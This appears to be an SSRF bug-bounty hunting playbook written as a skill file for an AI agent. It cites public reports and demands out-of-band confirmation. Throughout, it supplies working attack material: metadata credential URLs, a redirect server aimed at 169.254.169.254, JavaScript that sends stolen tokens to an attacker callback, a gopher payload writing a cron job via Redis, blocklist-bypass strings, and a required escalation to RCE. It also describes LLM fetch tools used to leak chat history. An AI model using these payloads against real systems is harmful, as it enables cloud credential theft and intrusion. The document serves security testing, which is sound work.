---
name: hunt-ssrf
description: Hunting skill for ssrf vulnerabilities. Built from 15 public bug bounty reports including AWS metadata SSRF (HackerOne $25k Analytics PDF, Shopify Exchange $25k, Capital One 106M-record breach, Dropbox/HelloSign $4,913), GCP metadata SSRF (Snapchat $4k), Azure IMDS SSRF (Azure DevOps $15k chain, ChatGPT Custom Actions MSRC), DNS rebinding SSRF (Concrete CMS, GitLab UrlBlocker), gopher-protocol-to-Redis-RCE (Yahoo Mail $15k), link-preview SSRF (Reddit Matrix $6k), and headless-browser PDF-generator SSRF chains. Use when hunting SSRF on any target — OOB Collaborator confirmation mandatory for blind cases.
sources: github, hackerone_public, portswigger_research, binarysecurity_research
report_count: 34
---
> **appsec-fyi supplement (source-cited, 2026 CVEs):** `references/appsec-fyi-techniques.md` —
> additive per-class technique list from https://appsec.fyi. Owner methodology below still wins.

> **Extra attack variants** (OpenEMR + PHP-core advisories — see §D): `skills/security/exploit-cookbook/references/openemr-php-advisory-techniques.md`

> **EXHAUSTIVE VARIANT MATRIX (run every sink through it):** `references/ssrf-vector-variants.md`.
> Ten catalogs: (1) cloud/IMDS endpoint matrix for ALL providers — not just AWS/GCP/Azure
> (Alibaba `100.100.100.200`, Scaleway `169.254.42.42`, Tencent `metadata.tencentyun.com`,
> Oracle, DigitalOcean); (2) full protocol/scheme matrix incl. `php://`, `jar://`, `expect://`;
> (3) exhaustive IP-encoding bypass (hex/octal/decimal/IPv6-mapped/0.0.0.0/decode-pass count);
> (4) URL parser-differential host-confusion (userinfo/backslash/fullwidth-dot/trailing-dot);
> (5) DNS-rebinding/TOCTOU; (6) gopher→service RCE ladder (Redis/Memcached/ES/Docker socket/FastCGI/
> SMTP/MySQL/Zabbix); (7) internal hostname & k8s service-discovery (`.svc.cluster.local`,
> `host.docker.internal`); (8) file-format SSRF carriers (SVG/ImageMagick/XLSX=WEBSERVICE/PDF);
> (9) CRLF header injection for Azure/GCP metadata auth; (10) escalation rungs. Read it before
> declaring any URL-accepting sink closed.

> **Document-viewer / link-preview `?url=` fetch (blind) — worked method**:
> `references/viewer-url-fetch-ssrf.md`. Read it before hunting a viewer/preview/unfurl endpoint.
> It carries four things this SKILL.md states only in the abstract: the outbound request carries the
> **service's own identity headers** (`User-Agent: <product> Viewer`, `X-Request-Attempt: 1`,
> `<vendor>-Cloud-Request-Id: dv-…-docviewer-front-stable-…`) which is what attributes the fetch to the
> service rather than the client; the fetch is **synchronous**, so the caller's own latency tracks it
> (OOB ~2.6–4.5 s vs DNS-fail/private/unroutable all ~1.4 s) — and that same band is why timing
> **cannot** prove private-range reach; the **read-back trap** where a viewer's `<title>` mirrors the URL's
> last path segment (looks like read-back, is string formatting — settle it with a unique marker in the fetched
> body); and the bypass battery that actually reproduced (decimal IP literal accepted, redirects followed, private
> ranges quietly refused ⇒ report the bypasses, keep internal reach in the not-demonstrated bucket).


## Crown Jewel Targets

SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes clusters, microservice meshes, internal APIs). Priority targets:

- **Cloud-hosted SaaS products** (GCP metadata at `169.254.169.254` or `metadata.google.internal`, AWS IMDSv1)
- **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
- **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
- **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
- **Dataset/file import pipelines** — anything that fetches remote URLs on behalf of a user
- **Enterprise self-hosted software** (GitHub Enterprise, GitLab) — SSRF frequently chains to RCE via internal services

Payouts are highest when SSRF reaches: cloud credentials → account takeover, internal admin APIs → data exfil, or chains to RCE.

---

## Non-obvious sinks — the URL is not always in a `?url=` param

The param-name lists below miss the sinks that pay best on modern apps, because the destination never
looks like a URL field. Check these before concluding "no URL-accepting parameter here":

| Sink | Where the destination hides | Why it fetches |
|---|---|---|
| **AI tool / JSON-Schema `$ref`** | `tools[].function.parameters.$ref` in an [OI]-style chat payload | backend resolves the schema before invoking the model — **confirmed live on Proton Lumo 2026-10-25, unauthenticated** |
| `$schema`, `$id`, OPML/RSS `xmlUrl`, JSON-LD `@context` | any import / structured-data endpoint | schema or feed resolution |
| Webhook + "test delivery" | `{"callback_url": …}` on a settings page | delivery test |
| Avatar / remote image import | `avatar_url`, `og:image` rehost | thumbnailer |
| PDF/HTML-to-image, screenshot, unfurl | template or `sourceUrl` body field | renderer |
| Archive/paste import (`git clone`, "import from URL") | repo/archive URL | clone/fetch |

For the AI-tool-schema variant the full probe matrix, timings and attribution discipline live in
**`references/ai-tool-schema-ref-ssrf.md`** — read it before hunting any chat/completions endpoint.
Ready-to-run matrix (control → external → internal, with the `--no-auth` and `--internal` opt-ins):
**`scripts/ai_tool_ref_probe.py`**.

### Verifying a blind fetcher that returns no body (dialled ≠ reachable ≠ readable)

A fetcher whose response body is *parsed* rather than returned still leaks three signals. Collect all
three, then write the severity honestly:

1. **Dialled** — OOB callback with the server's source IP, compared against your own egress IP
   (`curl https://api.ipify.org`) so a client-side fetch is excluded. Two callbacks per payload often
   means two fetch paths in the stack — note it, don't average it away.
   **Read the raw request headers at your listener.** Only `Host` + `Accept: */*` = the fetch carries
   no credentials and the ceiling is network position, not identity. Cookies / `Authorization` /
   a service token at your listener is a materially worse finding and belongs in the headline.
   (A `Referer` pointing at your own redirect hop is the redirect host echoing, not the target leaking.)
2. **Refused vs filtered** — send a closed loopback port and a filtered private address, twice each.
   TCP RST comes back in ~1–2 s; a filtered range hangs to the connect timeout (~30 s). That *is* a
   working internal host/port oracle and it belongs in the report. It does **not** prove the range is
   readable — keep "reach" and "read" in separate buckets.
3. **Content oracle** — if the fetched body is parsed (JSON schema, RSS, JSON-LD), point `$ref` at a
   host you control serving valid vs invalid content and diff the status: 200/parse-ok vs 500/parse-fail
   tells the attacker whether an internal URL returns the right *shape* of data. That is a boolean read
   primitive even though no body is returned.
   **Make it discriminating, not coarse.** "valid JSON vs garbage" is dismissible as JSON parsing.
   For schema-parsing sinks, serve `{"not":"a schema"}` (valid JSON, invalid schema: `not` must hold a
   schema) — a 500 there and a 200 for a real schema proves *schema validation*, which is the actual
   oracle. Then put a unique marker inside the fetched document and grep the response: marker absent =
   boolean only, so never write "read". Measured matrix and the exact b64 technique:
   `references/ai-tool-schema-ref-ssrf.md`.

**Negative control is mandatory here.** These fetchers validate the request body first, so a mutated
payload can 500 *without ever dialling*. Prove the malformed-body path produces a fast 500 and zero
callbacks; only then does a callback on the well-formed payload mean schema resolution caused the fetch
rather than the error handler. Same discipline as the per-parameter attribution above.

---

## OOB-Or-It-Didn't-Happen Gate (Read First)

**Claims of blind SSRF require an out-of-band (OOB) confirmation. Always. No exceptions.**

OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canarytoken, or any DNS+HTTP receiver you control that confirms the server actually made an outbound network connection on your behalf.

### What is NOT confirmation of SSRF

- The server **echoing your URL back in an error message**. Example: `"The Web application at http://evil.example.com/x could not be found"` — this is the server formatting your input into an error string, NOT making an outbound HTTP request. The error came from string formatting, not from network failure.
- The server returning a different status code for an external URL vs `localhost`. Different error responses can come from URL-scheme validators, not from actual fetching.
- A delayed response when the URL is sent. Delay can come from DNS resolution attempts within the parser, not from completed HTTP fetches.

### What IS confirmation of SSRF

- A DNS lookup for your unique Collaborator subdomain appears in the OOB listener.
- An HTTP request to your Collaborator HTTP endpoint with the server's source IP and User-Agent.
- For SSRF in JavaScript-execution contexts (PDF renderers, headless browsers), a fetch from the server to your callback URL.

### Default workflow

1. **Plant the Collaborator payload first.** Sub-tagging (`dlsrcurl.<collab>`,
   `import.<collab>`) only works if your listener actually reports the queried
   subdomain back to you — **verify that before relying on it.** Burp's
   `get_collaborator_interactions` keys results by **payload ID, not by subdomain**,
   so several sub-tags generated from one payload are indistinguishable in the
   output. When that is the case, **generate a fresh payload per candidate
   parameter** and send exactly one request per payload.
2. **Send the request** to the target endpoint.
3. **Wait 30–120 seconds**, then poll the OOB listener.
4. **Only after a confirmed callback** do you claim SSRF.
5. If zero callbacks across all sub-tagged sinks: SSRF claims must be retracted, even if error messages echo URLs.

**Lesson from a authorized engagement:** SharePoint's `/_layouts/15/download.aspx?SourceUrl=` returned 500 with the title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF (server clearly processed the URL). 38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded **zero DNS or HTTP interactions**. The "echo" was client-side error-string formatting; the server never made an outbound HTTP request. The path is actually an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this as SSRF would have been N/A'd at triage.

### Attribute the callback to ONE parameter before reporting

A callback proves the server made a request. It does **not** tell you which
parameter caused it, and the fix depends entirely on that.

```
BAD   — four candidate fields, one payload, fired in one batch
        -> callbacks arrive, attribution impossible, retest required

GOOD  — fresh payload per field, one request each, poll between
        url      -> callbacks    <- this is the sink
        apiUrl   -> none
        endpoint -> none
        target   -> none
```

**Run the negative control.** A parameter that produces *no* callback is evidence,
and it belongs in the report — it is what lets the client fix the right field
instead of allowlisting the wrong one.

**Lesson from an authorized engagement.** A server-side request-forwarding endpoint
accepted both `url` and `apiUrl`. The application's own stored config used `apiUrl`,
so that was the obvious suspect — but `apiUrl` was inert and **`url` was the live
sink**.
Batch-firing both had produced callbacks with no attribution; only per-payload
isolation identified the real parameter. A report naming `apiUrl` would have sent
the client to patch a field that does nothing.

### Blind vs full-read — establish which before scoring

After a callback confirms the request leaves the server, **check whether the
upstream response body is returned to you.** These are different findings:

- **Blind** (callback only, no body): on the never-submit list standalone. Needs an
  internal service reached, or data returned, to be reportable.
- **Full-read** (upstream body in the response): substantially higher severity —
  read arbitrary internal endpoints directly.

```bash
# one request settles it: fetch something with a known, recognisable body
-d '{"url":"https://example.com/"}'
# {"statusCode":200,"data":"<!doctype html>...<title>Example Domain</title>..."}
#                          ^ body returned = full-read, not blind
```

Also body-diff a known-internal target against a known-external one. A **distinct
status** on a link-local address (e.g. `401` from `169.254.169.254` where every
other target returns `200`) is the metadata service answering — that proves reach
to a non-internet-routable address, which a status code alone otherwise cannot.

### Fingerprint the DEPLOYED validator before believing the source (public route ≠ live route)

A route that has no validation in the public repo/OSS snapshot can be hardened in the build
that actually serves traffic. Before writing anything up, run a **target matrix** through the live
endpoint and read its own error strings as the deployed policy. Measured on pay.blink.sv
`POST /api/lnurl-proxy` (2026-10-12, unauthenticated; OSS snapshot had no session check and no
callback-origin check at all):

| case sent | live answer | what it proves |
|---|---|---|
| `lnurl` → public JSON host serving `{"tag":"withdrawRequest","callback":<X>}` | `Not a properly configured lnurl withdraw tag` | the attack-supplied URL **is** fetched server-side (fetch confirmed) |
| same-host callback that isn't LNURL-withdraw | `Withdraw request failed` | the callback **is** fetched and parsed |
| callback host ≠ lnurl host (`https://example.com/`, `https://blink.sv/`, `http://example.com/`) | `Invalid callback URL` | deployed build enforces a same-origin/public-host policy the snapshot lacks |
| `http://169.254.169.254/…`, `http://127.0.0.1:3000/…`, `http://10.0.0.1/` as the lnurl itself | `Invalid lnurl`, **<1.1 s** | private/link-local targets rejected at validation (fast = not a fetch timeout) |
| userinfo bypass callback `https://paste.rs@httpbin.org/json` | `Invalid callback URL` | they parse the URL and compare the **effective** host |
| `https://paste.rs/AAAA` (404 on the allowed host) | `LNURL service unreachable or not allowed` | fetch of the callback is attempted after validation |

Reading: fetch confirmed + private-IP rejection + same-origin enforcement = **hardened deployment, not a
finding**. Report it as a control with the matrix attached, never as an SSRF. The general rule this encodes:
*source without validation is a hypothesis; the live error-string matrix is the policy.*

**You need to serve attacker-authored JSON to run that matrix.** A plain `curl --data-binary @file
https://paste.rs` returns a URL that serves your exact bytes — pick a paste host that is not behind hard
bot rules (some free paste/JSON hosts answer `403` to non-browser clients), and keep one paste **per case**
so the callback you are testing is never ambiguous. For blind-only confirmation, interactsh is still the gate
(§ OOB-Or-It-Didn't-Happen), but a host that echoes JSON is what lets you test the *validator*.


---

## Attack Surface Signals

### URL Patterns to Hunt
```
/api/*/preview
/api/*/fetch
/api/*/import
/api/*/webhook
/api/*/proxy
/api/*/render
/api/*/link
/api/*/screenshot
/api/*/export
/api/*/validate
?url=
?uri=
?endpoint=
?redirect=
?src=
?source=
?feed=
?host=
?target=
?dest=
?file=
?path=
?callback=
?image=
?load=
?fetch=
```

### JS Patterns (in client-side code)
```javascript
// Look for these in JS bundles
fetch(userInput)
axios.get(params.url)
XMLHttpRequest + variable URL
url: req.body.url
src: params.source
href: query.endpoint
```

### Response Header Signals
```
X-Forwarded-For headers echoed back
Server: internal-service
Via: 1.1 internal-proxy
X-Cache headers revealing internal hostnames
```

### Tech Stack Signals
- **Kubernetes** — any public-facing aggregated API, metrics endpoints
- **GCP** — any service fetching URLs that runs on Compute Engine/GKE
- **Node.js/Python** with URL-fetching libraries (`requests`, `node-fetch`, `axios`)
- **Headless browsers** (Puppeteer, PhantomJS) used for screenshots/PDF — extremely high value
- **XML/DSPL/CSV import features** — XXE-style SSRF vector
- **OAuth/webhook registration** endpoints

---

## Step-by-Step Hunting Methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check all API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.

2. **Set up an out-of-band detection server** using Burp Collaborator, interactsh, or `https://canarytokens.org` — you need a unique per-test DNS/HTTP callback domain.

3. **Send your callback URL as the parameter value first** (blind SSRF check before anything else):
   ```
   url=https://YOUR.interactsh.com/test
   ```
   Confirm the server makes an outbound connection. This proves execution before attempting internal targets.

4. **Test internal cloud metadata endpoints**:
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - Azure: `http://169.254.169.254/metadata/instance`

5. **Test localhost and common internal ports**:
   ```
   http://localhost/
   http://127.0.0.1:8080/
   http://127.0.0.1:6443/  (Kubernetes API)
   http://127.0.0.1:2379/  (etcd)
   http://127.0.0.1:9090/  (Prometheus)
   http://127.0.0.1:9200/  (Elasticsearch)
   ```

6. **Check for redirect-based SSRF** — if the endpoint validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses. Kubernetes report (Report 3) was specifically triggered by hijacked API servers returning 30x responses.

7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers):
   - Inject `<script>` tags that make `XMLHttpRequest` or `fetch()` calls to internal services
   - Exfil via DNS: encode response data in subdomain of your callback domain

8. **Enumerate the internal network** using timing differences and error message variations:
   - Port scan via response time (`connection refused` vs timeout)
   - Check error messages for hostname/IP leakage

9. **Chain findings** — if you have SSRF to internal services, look for:
   - Unauthenticated admin endpoints
   - Redis, memcached (protocol smuggling)
   - Internal OAuth token endpoints
   - SSRF → CSRF → RCE (GitHub Enterprise pattern)

10. **Document the full chain** with screenshots of each hop before reporting.

---

## Payload & Detection Patterns

### Basic Out-of-Band Detection
```bash
# Using interactsh-client
interactsh-client -v

# Test parameter
curl -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"

# With common headers that might unlock SSRF
curl -s "https://target.com/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://YOUR_ID.oast.pro"}'
```

### Cloud Metadata Payloads
```bash
# GCP - requires Metadata-Flavor header (test if server adds it automatically)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/project/project-id
http://metadata/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# AWS IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
# AWS ECS task credentials (retrieve from env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}

# Azure - instance metadata and managed identity token
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires Metadata: true header for Azure requests

# Kubernetes service account credentials (file:// SSRF)
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### Localhost/Internal Port Payloads
```bash
# Kubernetes internals
http://127.0.0.1:6443/api/v1/namespaces
http://10.0.0.1:6443/api/v1/secrets
http://127.0.0.1:10250/pods          # kubelet
http://127.0.0.1:2379/v2/keys        # etcd

# Common internal services
http://127.0.0.1:6379/               # Redis (check for inline commands)
http://127.0.0.1:9200/_cat/indices   # Elasticsearch
http://127.0.0.1:5601/               # Kibana
http://127.0.0.1:8500/v1/catalog/services  # Consul
```

### Redirect-Based SSRF (when direct is blocked)
```python
# Simple Python redirect server
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()
```

### JavaScript-Based SSRF (headless browser contexts)
```javascript
// Exfil via fetch
fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {
  headers: {'Metadata-Flavor': 'Google'}
}).then(r=>r.text()).then(d=>{
  fetch('https://YOUR.callback.com/?d='+btoa(d))
})

// DNS exfil for blind contexts
var x = new XMLHttpRequest();
x.open('GET','http://169.254.169.254/latest/meta-data/');
x.send();
x.onload = function(){
  var img = new Image();
  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';
}
```

### Grep Patterns for Source Code Review
```bash
# Find URL fetch operations
grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"

# Find URL parameters being passed to HTTP clients
grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"

# Find redirect following
grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"
```

### ffuf Parameter Discovery
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \
  -fs 0 -mc all
```

---

## Common Root Causes

1. **"The user said it was safe"** — Developers trust user-supplied URLs for fetching remote resources (link previews, thumbnails, webhooks) without validating the destination. The feature is legitimate; the missing validation is the bug.

2. **Allowlist bypass via redirects** — Developers validate the initial URL against an allowlist but configure HTTP clients to follow redirects automatically. An attacker's server on the allowlist redirects to an internal address.

3. **Aggregated/proxy API trust** — Kubernetes-style architectures where an API aggregation layer blindly proxies 30x responses from registered extension servers. Compromising a single extension server gives SSRF into the core API.

4. **Server-side rendering without sandboxing** — Headless browser features (PDF generation, link preview screenshots) execute attacker-controlled JavaScript in a network-privileged context with access to metadata services.

5. **XML/DSPL/file parsers fetching external entities** — Import features that parse structured files (XML, DSPL, CSV with remote schemas) fetch attacker-controlled URLs, often with no URL validation at all.

6. **Internal hostname leakage via response differences** — Services return different error messages, timing, or response sizes for internal vs. external hosts, enabling blind enumeration even when content isn't returned.

7. **IMDSv1 still enabled** — Cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the `Metadata-Flavor` header (GCP) allow unauthenticated credential access from any SSRF.

---

## Bypass Techniques

### Blocklist Bypasses (When `localhost`, `127.0.0.1`, `169.254.x.x` are blocked)

```
# IPv6 equivalents
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:169.254.169.254]/

# Decimal/octal/hex encoding of IP
http://2130706433/          (127.0.0.1 decimal)
http://0x7f000001/          (127.0.0.1 hex)
http://0177.0.0.1/          (octal)
http://127.1/               (short form)
http://0/                   (resolves to 0.0.0.0)

# DNS rebinding - register a domain that resolves to internal IP after first check
# Use https://lock.cmpxchg8b.com/rebinder.html

# Subdomain pointing to internal IP
http://localtest.me/         (resolves to 127.0.0.1)
http://127.0.0.1.nip.io/
http://customer.attacker.com/ (A record → 192.168.1.1)

# URL parser confusion
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com
http://127.0.0.1%25@evil.com  (URL encoding)
http://evil.com\.127.0.0.1/   (backslash)

# Protocol confusion
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)
sftp://attacker.com:11111/
ldap://127.0.0.1/

# Redirect chain bypass
https://allowlisted-domain.com → HTTP 301 → http://169.254.169.254/

# Case variation / URL encoding
http://Localhost/
http://127.0.0.1%2F@evil.com/
```

### App-layer input-encoding bypass (filter sees one thing, fetcher another)
When the endpoint takes the target URL **wrapped/encoded** — a base64 blob in the path, a
double-encoded param, a JSON-nested value — the front-end WAF/allowlist inspects the *raw*
input while the backend **decodes it before fetching**. Encode the internal target so the
filter never sees `169.254` / `localhost` in clear:
```
# target URL base64'd into a path segment the app decodes, then fetches
GET /proxy/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=/x.js   # = http://169.254.169.254/  (disclosed: reports/1189367)
# double-URL-encode the host so one decode pass survives the filter
url=http%253A%252F%252F169.254.169.254%252F
```
Always test whether the parameter is decoded once, twice, or base64'd before the fetch — the number of decode passes is the bug.

### Path-normalization / semicolon bypass (front-end filter vs origin path)
A front-end that blocks `url=` to internal hosts can be skipped when the origin re-normalizes
path segments the edge left intact — inject `;/`, `/../`, or matrix-param segments so the edge
routes it as benign but the origin resolves the SSRF fetch:
```
GET /;/;/resource/md/get/url?url=http://oast.example/   # edge ignores, origin fetches (disclosed: reports/2035332)
```
Full-read SSRF via this path-confusion reaches cloud-credential endpoints the direct `url=` param blocked.

### Schema/Protocol Bypasses
```
# When only http/https allowed but implementation is loose
http://169.254.169.254:80@evil.com/
//169.254.169.254/
```

### TOCTOU (Time-of-Check vs Time-of-Use)
- Validate URL → sleep → redirect to internal (race condition with DNS rebinding)
- Register a domain with 0-TTL, rotate DNS between validation and fetch calls

### When Response is Not Returned (Blind SSRF)
- Use DNS-only callbacks (data encoded in subdomain labels)
- Use timing differences for port scanning
- Use different HTTP methods (PUT/DELETE) to trigger distinct behaviors on internal services
- Chain with other bugs that leak response data (e.g., error messages, logs)

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you retrieve a response proving internal network access? (Show the metadata token, internal API response, or confirmed DNS callback)
   - If blind: can you demonstrate port differentiation or confirmed OOB callback tied to a specific internal address?
   - "The server makes a request" alone is insufficient — show *where* it goes and *what comes back*.

2. **What does the victim LOSE?**
   - Cloud credentials (IAM tokens) → full cloud account compromise?
   - Internal service data (user PII, secrets, API keys)?
   - Ability to pivot to RCE via internal admin service?
   - If the answer is only "the server fetches my URL," severity is low — quantify the actual reachable blast radius.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint still live and the parameter still present?
   - Does your callback server show the hit reliably (not intermittently)?
   - Can a second person follow your steps without prior knowledge and get the same result?
   - If reproduction requires specific timing, tokens, or luck — resolve the flakiness before submitting.

---

## Real Impact Examples

### Scenario A: Cloud Credential Exfiltration via Link Preview (Snapchat/GCP Pattern)
A public-facing "link preview" API accepted a `url` parameter and fetched the target server-side to generate thumbnail content. The feature ran on GCP Compute Engine with IMDSv1 enabled and no `Metadata-Flavor` header enforcement on the server side. By supplying `url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, the attacker received a valid OAuth2 access token for the instance's service account. The token granted access to internal GCP project resources including storage buckets containing user data. The attacker used JavaScript execution within a headless rendering context to exfiltrate the token via DNS-encoded subdomains, bypassing response body restrictions.

### Scenario B: Kubernetes API Compromise via Hijacked Aggregated Server (Kubernetes Pattern)
An attacker who could register a Kubernetes API extension server (metrics-server equivalent) returned `302 Location: http://127.0.0.1:6443/api/v1/secrets` responses to the aggregation layer. Because the aggregation proxy followed redirects automatically without re-validating the destination against the internal network blocklist, the redirect caused the aggregation layer itself (running with elevated cluster credentials) to fetch internal Kubernetes API secrets and return them in the response. This effectively allowed an attacker with limited API registration privileges to escalate to full cluster secret read access — a critical privilege escalation via SSRF chained through trusted infrastructure components.

---

## Disclosed Report Citations (Backfill +6 — 2018-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Cloud-metadata SSRFs across all three providers, DNS rebinding, gopher-to-Redis-RCE, link-preview SSRF, and headless-browser/PDF-generator chains are all represented.

3. **HackerOne — SSRF in Analytics Reports (PDF generator → AWS metadata)** ([H1 #2262382](https://hackerone.com/reports/2262382) · [Writeup](https://osintteam.blog/25-000-ssrf-in-hackerones-analytics-reports-b9a5b3aa3d6e))
    - Subclass: headless-browser SSRF (PDF generator) → AWS metadata SSRF (IMDSv1)
    - Payload: injected `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` into a template element rendered server-side; backend Ruby loop rendered the untrusted template HTML into PDF, reflecting IMDS response inside the rendered PDF / error message
    - Root cause: unsanitised user-controlled template fragment reflected in PDF rendering pipeline; no IMDSv2 enforcement
    - Year: 2023 — **$25,000** (CVSS 10.0 Critical)

4. **Shopify Exchange — SSRF in screenshot service → GCP metadata → container root** ([H1 #341876](https://hackerone.com/reports/341876))
    - Subclass: GCP metadata SSRF → SSRF-to-RCE chain
    - Payload: created store on partners.shopify.com, edited `password.liquid` template to embed a request to `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`, then triggered the Exchange screenshotting service to render the template server-side
    - Root cause: screenshotter fetched user-controlled template with no metadata-host blocklist and no metadata-concealment proxy
    - Year: 2018 — **$25,000** (canonical headless-browser → metadata)

5. **Concrete CMS — SSRF mitigation bypass via DNS rebinding → AWS IAM keys** ([H1 #1369312](https://hackerone.com/reports/1369312))
    - Subclass: DNS rebinding SSRF → AWS metadata SSRF (IMDSv1)
    - Payload: file-upload-from-URL feature; attacker DNS server alternated `A` records between `1.2.3.4` (public) and `169.254.169.254`; needed 2-3 requests to win the race between validation and fetch; final request retrieved IAM role credentials
    - Root cause: validated hostname by resolving once; download path re-resolved DNS without pinning the validated IP
    - Year: 2021 — fixed in 8.5.7 / 9.0.1

6. **Yahoo Mail — Blind SSRF → Gopher → Redis RCE** ([Writeup](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530))
    - Subclass: gopher protocol abuse → Redis SSRF → SSRF-to-RCE chain
    - Payload: blind SSRF in Yahoo Mail backend reached via `gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall...SET stuff /var/spool/cron/root...BGSAVE` — wrote a cron via Redis to get command execution
    - Root cause: gopher scheme not blocklisted; internal Redis unauthenticated on default port; SSRF target accepted 302 redirect from attacker host to `gopher://`
    - Year: 2020 — **$15,000**

7. **Reddit Matrix — Blind SSRF in `preview_url` API** ([H1 #1960765](https://hackerone.com/reports/1960765))
    - Subclass: link-preview SSRF (blind, internal port-scan via timing/response codes)
    - Payload: `GET https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=http://10.0.0.0:80/` — varied internal IPs/ports; service names and IPs leaked through response differences before the fix
    - Root cause: link-preview fetcher did not reject RFC1918 / link-local destinations; allowlist-by-scheme only
    - Year: 2023 — **$6,000**

8. **Azure DevOps — SSRF in Service Hooks + DNS rebinding bypass in endpointproxy** ([Binary Security writeup](https://www.binarysecurity.no/posts/2025/01/finding-ssrfs-in-devops))
    - Subclass: webhook URL field SSRF + DNS rebinding SSRF → Azure IMDS / managed identity
    - Payload: configured service-hook webhook URL or `endpointproxy` URL parameter to attacker rebinding host; second resolution returned `169.254.169.254`; chained CRLF injection to set required `Metadata: true` header for Azure IMDS
    - Root cause: validation-then-fetch with separate DNS lookups; CRLF in URL path injected headers needed by Azure IMDS
    - Year: 2023-2024 — **$15,000 total** across 3 reports

---

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Parameter URL/webhook/image: arahkan ke host kamu | Callback dasar |
| 2 | Cloud metadata: `http://169.254.169.254/latest/meta-data/` | Kredensial cloud |
| 3 | Protokol: `file://`, `gopher://`, `dict://` | Smuggling protokol |
| 4 | Internal service: port scan localhost & rentang internal | Jangkauan internal |
| 5 | Eksfiltrasi respons: tampilkan konten endpoint internal | Dampak nyata |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** paksa server request ke host internal

**Teknik pengembangan:** 169.254.169.254 -> kredensial cloud; gopher://redis -> tulis cron; internal admin console -> RCE

**Eskalasi ke:** `hunt-rce` · `hunt-info-disclosure` · `cloud-misconfig`

**Depth target:** L2 -> L5

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Related Skills & Chains

- **Surface atlas** (`security/bb-audit-launcher/references/ato-idor-ssrf-surface-atlas.md`) — the 31 trigger surfaces for ATO / IDOR-BOLA / SSRF: where to look, what proves it, and the severity per surface. This skill is the depth; the atlas is the coverage checklist.

- **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **`hunt-llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **`hunt-rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
